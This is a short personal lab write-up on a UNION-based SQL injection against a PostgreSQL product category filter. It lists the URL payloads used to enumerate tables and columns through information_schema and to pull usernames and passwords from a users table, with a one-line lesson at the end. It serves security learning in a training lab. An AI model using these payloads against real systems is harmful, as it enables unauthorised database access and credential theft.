---
topic: SQL injection
level: Practitioner
time_spent: 20 min
date: 23rd Nov, 2026
Database type: PostgreSQL
---

**Vulnerability:** 
SQL injection vulnerability in the product category filter.

**Payload:**
```
category='UNION+SELECT+NULL+NULL--
category='UNION+SELECT+'sde'+'abc'--
category='UNION+SELECT+table_name+NULL+FROM+information_schema.tables--
```

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md_Attachments/-20261123.png)

```
category='+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_twvbrq'--
```

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md_Attachments/-20261123-1.png)

```
category='+UNION+SELECT+username_rrbljq,password_lzvmno+FROM+users_twvbrq--
```

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md_Attachments/-20261123-2.png)

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md_Attachments/-20261123-3.png)

**What I learned:**
We can use the information_schema.tables to get relevant table and column information using the UNION and can retrieve the passwords and usernames and other interesting information.
